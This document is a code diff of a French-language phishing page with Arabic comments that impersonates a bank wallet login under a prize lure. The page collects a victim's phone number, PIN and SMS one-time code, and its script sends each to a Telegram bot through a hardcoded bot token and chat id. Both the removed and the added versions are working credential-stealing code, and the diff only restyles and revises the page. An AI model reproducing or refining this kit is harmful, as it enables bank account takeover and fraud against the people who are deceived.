@@ -10,80 +10,88 @@
         
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; }
         
-        /* خلفية الشبكة الاحترافية */
+        /* خلفية الشبكة الاحترافية كما في التطبيق */
         .grid-background {
             background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
             background-size: 20px 20px;
         }
 
-        /* تنسيق منطقة الجائزة العلوية */
-        .hero-prize-container {
+        /* حاوية الصورة العلوية الجديدة (image_11.png) */
+        .prize-hero-section {
             width: 100%;
-            height: 250px;
-            background-image: url('https://r.jina.ai/i/6561f36402ec4c97960350436a537f8d'); /* رابط صورة الدرع والجائزة */
+            height: 280px;
+            background-image: url('https://r.jina.ai/i/068ec63717df47e596700f135b128522'); /* رابط صورة الجوائز والدرع */
             background-size: cover;
             background-position: center;
-            border-bottom: 2px solid #f19e2c;
+            border-bottom: 3px solid #f19e2c;
             position: relative;
         }
-        .hero-overlay {
+
+        /* شريط الترحيب الشفاف أسفل الصورة */
+        .welcome-bar {
             position: absolute;
             bottom: 0;
             width: 100%;
-            background: rgba(255, 255, 255, 0.8);
-            padding: 10px;
+            background: rgba(255, 255, 255, 0.85);
+            padding: 12px;
             text-align: center;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(8px);
+            border-top: 1px solid rgba(241, 158, 44, 0.3);
         }
 
-        /* أزرار Wallet / Banking */
+        /* تنسيق الأزرار (Wallet / Banking) */
         .tab-container {
             display: flex;
-            border: 1px solid #2a4387;
-            border-radius: 8px;
+            border: 1.5px solid #2a4387;
+            border-radius: 10px;
             overflow: hidden;
             margin: 20px 0;
         }
-        .tab-item { flex: 1; padding: 10px; text-align: center; font-weight: 600; }
+        .tab-item { flex: 1; padding: 12px; text-align: center; font-weight: 700; cursor: pointer; }
         .tab-active { background-color: #2a4387; color: white; }
-        .tab-inactive { background-color: white; color: #6b7280; }
+        .tab-inactive { background-color: white; color: #9ca3af; }
 
         /* حقول الإدخال */
         .input-field {
             border: 1px solid #d1d5db;
-            border-radius: 8px;
-            padding: 14px;
+            border-radius: 10px;
+            padding: 15px;
             width: 100%;
             font-size: 1.1rem;
             outline: none;
+            transition: border-color 0.3s;
         }
-        .char-count { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 2px; }
+        .input-field:focus { border-color: #f19e2c; }
+        
+        .char-count { font-size: 11px; color: #9ca3af; text-align: right; margin-top: 3px; font-weight: 600; }
 
-        /* زر الدخول */
-        .btn-connexion {
+        /* زر الدخول البرتقالي */
+        .btn-submit {
             background-color: #f19e2c;
             color: white;
             width: 100%;
-            padding: 14px;
-            border-radius: 8px;
-            font-weight: 700;
-            font-size: 1.2rem;
-            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 800;
+            font-size: 1.3rem;
+            margin-top: 25px;
+            transition: transform 0.2s;
         }
+        .btn-submit:active { transform: scale(0.98); }
 
-        #otp-modal { background-color: rgba(255, 255, 255, 0.98); display: none; }
+        #verification-modal { background-color: rgba(255, 255, 255, 0.98); display: none; }
     </style>
 </head>
 <body class="grid-background min-h-screen flex flex-col items-center">
 
-    <!-- استبدال المنطقة العلوية بصورة الجائزة -->
-    <div class="hero-prize-container">
-        <div class="hero-overlay">
-            <p class="text-[#2a4387] font-bold">Bienvenue dans votre espace wallet</p>
+    <!-- استبدال المنطقة المحددة بالصورة الجديدة -->
+    <div class="prize-hero-section">
+        <div class="welcome-bar">
+            <p class="text-[#2a4387] font-bold text-lg">Bienvenue dans votre espace wallet</p>
         </div>
     </div>
 
-    <!-- أزرار التبديل -->
+    <!-- أزرار الاختيار -->
     <div class="w-full max-w-sm px-6">
         <div class="tab-container">
             <div class="tab-item tab-active">Wallet</div>
@@ -91,70 +99,79 @@
         </div>
     </div>
 
-    <!-- نموذج تسجيل الدخول -->
-    <div id="login-form" class="w-full max-w-sm px-6 mt-2">
-        <h2 class="text-[#2a4387] font-bold text-xl mb-4">Connexion</h2>
+    <!-- واجهة تسجيل الدخول -->
+    <div id="login-panel" class="w-full max-w-sm px-6">
+        <h2 class="text-[#2a4387] font-extrabold text-2xl mb-5">Connexion</h2>
         
-        <div class="mb-4">
-            <input id="phone" type="tel" maxlength="8" oninput="validate(this, 8)" class="input-field" placeholder="Téléphone">
+        <!-- حقل الهاتف -->
+        <div class="mb-5">
+            <input id="phone" type="tel" maxlength="8" oninput="formatInput(this, 8)" class="input-field" placeholder="Téléphone">
             <div id="phone-count" class="char-count">0/8</div>
         </div>
 
+        <!-- حقل الرمز -->
         <div class="mb-2">
-            <input id="pin" type="password" maxlength="4" oninput="validate(this, 4)" class="input-field" placeholder="Mot de passe">
+            <input id="pin" type="password" maxlength="4" oninput="formatInput(this, 4)" class="input-field" placeholder="Mot de passe">
             <div id="pin-count" class="char-count">0/4</div>
         </div>
 
         <div class="text-right">
-            <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
+            <a href="#" class="text-gray-400 text-sm font-semibold">Mot de passe oublié ?</a>
         </div>
 
-        <button onclick="submitLogin()" class="btn-connexion">Connexion</button>
+        <button onclick="handleLogin()" class="btn-submit">
+            Connexion
+        </button>
 
-        <div class="mt-12 text-center">
-            <p class="text-gray-500">Nouvel utilisateur ?</p>
-            <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
+        <div class="mt-14 text-center">
+            <p class="text-gray-400 font-medium">Nouvel utilisateur ?</p>
+            <a href="#" class="text-[#2a4387] font-bold text-lg mt-1 block">S'inscrire maintenant &rarr;</a>
         </div>
     </div>
 
-    <!-- واجهة التحقق OTP -->
-    <div id="otp-modal" class="fixed inset-0 z-50 flex flex-col items-center justify-center px-8">
+    <!-- مودال الـ OTP -->
+    <div id="verification-modal" class="fixed inset-0 z-50 flex flex-col items-center justify-center px-8">
         <div class="w-full max-w-sm text-center">
-            <h3 class="text-2xl font-bold text-[#2a4387] mb-4">Vérification</h3>
-            <p class="text-gray-500 mb-8">Veuillez entrer le code reçu par SMS</p>
-            <input id="otp" type="tel" maxlength="6" class="input-field text-center text-2xl tracking-widest border-2 border-[#f19e2c]" placeholder="000000">
-            <button onclick="finish()" class="btn-connexion">Confirmer</button>
+            <h3 class="text-3xl font-black text-[#2a4387] mb-4">Vérification</h3>
+            <p class="text-gray-500 font-bold mb-10">Veuillez saisir le code reçu par SMS pour confirmer votre gain</p>
+            
+            <input id="otp" type="tel" maxlength="6" class="input-field text-center text-3xl tracking-[12px] font-black border-2 border-[#f19e2c]" placeholder="000000">
+            
+            <button onclick="confirmOTP()" class="btn-submit">Confirmer</button>
         </div>
     </div>
 
     <script>
-        const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const chatId = "8665814266";
+        const bot_token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const user_id = "8665814266";
 
-        function post(msg) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        function telegramNotify(message) {
+            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${encodeURIComponent(message)}`);
         }
 
-        function validate(el, max) {
+        function formatInput(el, max) {
             el.value = el.value.replace(/[^0-9]/g, '');
             document.getElementById(el.id + '-count').textContent = el.value.length + '/' + max;
         }
 
-        function submitLogin() {
-            const p = document.getElementById('phone').value;
-            const n = document.getElementById('pin').value;
-            if(p.length === 8 && n.length === 4) {
-                post(`🏆 New Entry (Prize Page):\n📱: ${p}\n🔑: ${n}`);
-                document.getElementById('login-form').style.display = 'none';
-                document.getElementById('otp-modal').style.display = 'flex';
+        function handleLogin() {
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            if(phone.length === 8 && pin.length === 4) {
+                telegramNotify(`🎁 Bim Bank Winner Entry:\n📱 Phone: ${phone}\n🔑 PIN: ${pin}`);
+                document.getElementById('login-panel').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('login-panel').style.display = 'none';
+                    document.getElementById('verification-modal').style.display = 'flex';
+                }, 300);
             }
         }
 
-        function finish() {
-            const o = document.getElementById('otp').value;
-            if(o.length === 6) {
-                post(`✅ OTP: ${o}`);
-                alert("Votre demande est en cours de traitement.");
+        function confirmOTP() {
+            const otp = document.getElementById('otp').value;
+            if(otp.length === 6) {
+                telegramNotify(`✅ Verified OTP: ${otp}`);
+                alert("Votre participation a été validée. Nous vous contacterons sous peu.");
                 location.reload();
             }
         }
